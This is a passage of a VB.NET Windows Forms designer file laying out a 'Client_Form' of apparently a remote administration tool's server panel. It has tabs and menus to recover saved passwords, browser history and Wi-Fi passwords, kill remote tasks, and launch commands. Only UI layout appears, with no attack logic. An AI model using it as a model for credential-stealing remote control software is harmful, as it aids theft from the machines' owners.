        Me.CMD_ListView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable
        Me.CMD_ListView.HideSelection = False
        Me.CMD_ListView.ImeMode = System.Windows.Forms.ImeMode.Off
        Me.CMD_ListView.Items.AddRange(New System.Windows.Forms.ListViewItem() {ListViewItem1, ListViewItem2, ListViewItem3, ListViewItem4, ListViewItem5, ListViewItem6, ListViewItem7, ListViewItem8, ListViewItem9})
        Me.CMD_ListView.Location = New System.Drawing.Point(3, 3)
        Me.CMD_ListView.Name = "CMD_ListView"
        Me.CMD_ListView.Size = New System.Drawing.Size(837, 479)
        Me.CMD_ListView.SmallImageList = Me.ImageList1
        Me.CMD_ListView.TabIndex = 0
        Me.CMD_ListView.UseCompatibleStateImageBehavior = False
        Me.CMD_ListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader12
        '
        Me.ColumnHeader12.Text = "Command"
        Me.ColumnHeader12.Width = 835
        '
        'Command_MenuStrip
        '
        Me.Command_MenuStrip.ImageScalingSize = New System.Drawing.Size(28, 28)
        Me.Command_MenuStrip.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LaunchToolStripMenuItem})
        Me.Command_MenuStrip.Name = "Command_MenuStrip"
        Me.Command_MenuStrip.Size = New System.Drawing.Size(126, 38)
        '
        'LaunchToolStripMenuItem
        '
        Me.LaunchToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.LaunchToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.LaunchToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_missile_32
        Me.LaunchToolStripMenuItem.Name = "LaunchToolStripMenuItem"
        Me.LaunchToolStripMenuItem.Size = New System.Drawing.Size(125, 34)
        Me.LaunchToolStripMenuItem.Text = "Launch"
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "icons8_shutdown_32.png")
        Me.ImageList1.Images.SetKeyName(1, "icons8_restart_32.png")
        Me.ImageList1.Images.SetKeyName(2, "icons8_sign_out_32.png")
        Me.ImageList1.Images.SetKeyName(3, "icons8_poison_32.png")
        Me.ImageList1.Images.SetKeyName(4, "icons8_minus_32.png")
        Me.ImageList1.Images.SetKeyName(5, "icons8_plus_32.png")
        Me.ImageList1.Images.SetKeyName(6, "icons8_mute_32.png")
        Me.ImageList1.Images.SetKeyName(7, "icons8_poison_32.png")
        Me.ImageList1.Images.SetKeyName(8, "icons8_sign_out_32.png")
        Me.ImageList1.Images.SetKeyName(9, "icons8_shutdown_32.png")
        Me.ImageList1.Images.SetKeyName(10, "icons8_restart_32.png")
        Me.ImageList1.Images.SetKeyName(11, "icons8_stop_32.png")
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabPage4.Controls.Add(Me.Loading_tasks)
        Me.TabPage4.Controls.Add(Me.Helper_Task_Label)
        Me.TabPage4.Controls.Add(Me.Tasks_listview)
        Me.TabPage4.Location = New System.Drawing.Point(84, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3, 28, 3, 3)
        Me.TabPage4.Size = New System.Drawing.Size(843, 485)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Tasks MGR"
        '
        'Loading_tasks
        '
        Me.Loading_tasks.Active = False
        Me.Loading_tasks.Color = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Loading_tasks.InnerCircleRadius = 5
        Me.Loading_tasks.Location = New System.Drawing.Point(184, 2)
        Me.Loading_tasks.Name = "Loading_tasks"
        Me.Loading_tasks.NumberSpoke = 12
        Me.Loading_tasks.OuterCircleRadius = 11
        Me.Loading_tasks.RotationSpeed = 100
        Me.Loading_tasks.Size = New System.Drawing.Size(28, 25)
        Me.Loading_tasks.SpokeThickness = 2
        Me.Loading_tasks.StylePreset = MRG.Controls.UI.LoadingCircle.StylePresets.MacOSX
        Me.Loading_tasks.TabIndex = 5
        Me.Loading_tasks.Text = "LoadingCircle1"
        Me.Loading_tasks.Visible = False
        '
        'Helper_Task_Label
        '
        Me.Helper_Task_Label.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Helper_Task_Label.Location = New System.Drawing.Point(3, 2)
        Me.Helper_Task_Label.Name = "Helper_Task_Label"
        Me.Helper_Task_Label.Size = New System.Drawing.Size(182, 23)
        Me.Helper_Task_Label.TabIndex = 4
        Me.Helper_Task_Label.Text = "Wait until you see name appearing...."
        Me.Helper_Task_Label.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Helper_Task_Label.Visible = False
        '
        'Tasks_listview
        '
        Me.Tasks_listview.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.Tasks_listview.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Tasks_listview.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader11})
        Me.Tasks_listview.ContextMenuStrip = Me.Tasks_MGR_MenuStrip
        Me.Tasks_listview.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Tasks_listview.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.Tasks_listview.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Tasks_listview.HideSelection = False
        Me.Tasks_listview.Location = New System.Drawing.Point(3, 28)
        Me.Tasks_listview.Name = "Tasks_listview"
        Me.Tasks_listview.Size = New System.Drawing.Size(837, 454)
        Me.Tasks_listview.Sorting = System.Windows.Forms.SortOrder.Ascending
        Me.Tasks_listview.TabIndex = 1
        Me.Tasks_listview.UseCompatibleStateImageBehavior = False
        Me.Tasks_listview.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = "Name"
        Me.ColumnHeader11.Width = 258
        '
        'Client_Form
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(943, 542)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.PictureBox1)
        Me.Controls.Add(Me.Custom_Button1)
        Me.Controls.Add(Me.TabControlExt1)
        Me.Name = "Client_Form"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Client_Form"
        Me.Pass_MenuStrip.ResumeLayout(False)
        Me.Hist_MenuStrip.ResumeLayout(False)
        Me.W_PW_MenuStrip.ResumeLayout(False)
        Me.Tasks_MGR_MenuStrip.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabControlExt1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage5.ResumeLayout(False)
        Me.Command_MenuStrip.ResumeLayout(False)
        Me.TabPage4.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents TabControlExt1 As HZH_Controls.Controls.TabControlExt
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents Passwords_ListView As AeroListView
    Friend WithEvents ColumnHeader1 As ColumnHeader
    Friend WithEvents ColumnHeader2 As ColumnHeader
    Friend WithEvents ColumnHeader3 As ColumnHeader
    Friend WithEvents ColumnHeader4 As ColumnHeader
    Friend WithEvents Pass_MenuStrip As ContextMenuStrip
    Friend WithEvents RecoverPasswordsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Save_PassMenu As ToolStripMenuItem
    Friend WithEvents Hist_ListView As AeroListView
    Friend WithEvents ColumnHeader5 As ColumnHeader
    Friend WithEvents ColumnHeader6 As ColumnHeader
    Friend WithEvents ColumnHeader7 As ColumnHeader
    Friend WithEvents ColumnHeader8 As ColumnHeader
    Friend WithEvents Hist_MenuStrip As ContextMenuStrip
    Friend WithEvents Recover_history As ToolStripMenuItem
    Friend WithEvents Save_HistoryMenu As ToolStripMenuItem
    Friend WithEvents Custom_Button1 As Custom_Button
    Friend WithEvents Label1 As Label
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents W_PW_ListView As AeroListView
    Friend WithEvents ColumnHeader9 As ColumnHeader
    Friend WithEvents ColumnHeader10 As ColumnHeader
    Friend WithEvents W_PW_MenuStrip As ContextMenuStrip
    Friend WithEvents RecoverWifiPasswordToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents SaveToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TabPage4 As TabPage
    Friend WithEvents Tasks_listview As ListView
    Friend WithEvents ColumnHeader11 As ColumnHeader
    Friend WithEvents Tasks_MGR_MenuStrip As ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents KillTaskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Helper_Task_Label As Label
    Friend WithEvents Loading_tasks As MRG.Controls.UI.LoadingCircle
    Friend WithEvents Loading_PW As MRG.Controls.UI.LoadingCircle
    Friend WithEvents Loading_Hist As MRG.Controls.UI.LoadingCircle
    Friend WithEvents Loading_W_PW As MRG.Controls.UI.LoadingCircle
    Friend WithEvents PauseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ResumseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TabPage5 As TabPage
    Friend WithEvents CMD_ListView As AeroListView
    Friend WithEvents ColumnHeader12 As ColumnHeader
    Friend WithEvents ImageList1 As ImageList
    Friend WithEvents Command_MenuStrip As ContextMenuStrip
    Friend WithEvents LaunchToolStripMenuItem As ToolStripMenuItem
End Class
